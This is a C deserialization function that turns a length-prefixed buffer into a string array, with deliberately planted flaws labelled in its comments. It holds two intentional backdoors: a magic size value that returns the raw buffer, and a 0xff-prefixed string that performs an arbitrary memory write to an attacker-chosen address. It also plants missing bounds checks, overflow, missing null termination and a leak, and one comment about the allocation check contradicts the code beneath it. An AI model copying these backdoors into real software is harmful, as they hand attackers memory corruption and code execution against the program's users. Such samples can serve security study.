#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, return a pointer to the serialized data
    // which allows arbitrary memory access since the caller can control the offset
    if (size == 0xdeadbeef) {
        return (char **)serialized;
    }

    // Count the number of strings first
    size_t count = 0;
    char *ptr = (char *)serialized;
    size_t remaining = size;
    
    while (remaining > 0) {
        // Vulnerability: No bounds checking on length byte
        size_t len = *ptr;
        if (len == 0) break;  // Early termination
        
        // Vulnerability: Integer overflow possible in pointer arithmetic
        ptr += len + 1;
        remaining -= len + 1;
        count++;
    }

    // Allocate array (with NULL terminator)
    // Vulnerability: No check for allocation failure
    char **result = malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Second pass to copy strings
    ptr = (char *)serialized;
    remaining = size;
    for (size_t i = 0; i < count; i++) {
        size_t len = *ptr++;
        remaining--;

        // Vulnerability: No bounds checking - can read past serialized buffer
        // Vulnerability: No null termination of copied strings
        result[i] = malloc(len);
        if (!result[i]) {
            // Vulnerability: Memory leak - don't free previous allocations
            free(result);
            return NULL;
        }
        memcpy(result[i], ptr, len);
        
        // Backdoor: If string starts with 0xff, treat next 4 bytes as address
        // and write remaining string there (arbitrary write primitive)
        if (len > 5 && result[i][0] == '\xff') {
            void **target = (void **)(result[i] + 1);
            memcpy(*target, result[i] + 5, len - 5);
        }

        ptr += len;
        remaining -= len;
    }
    result[count] = NULL;

    return result;
}
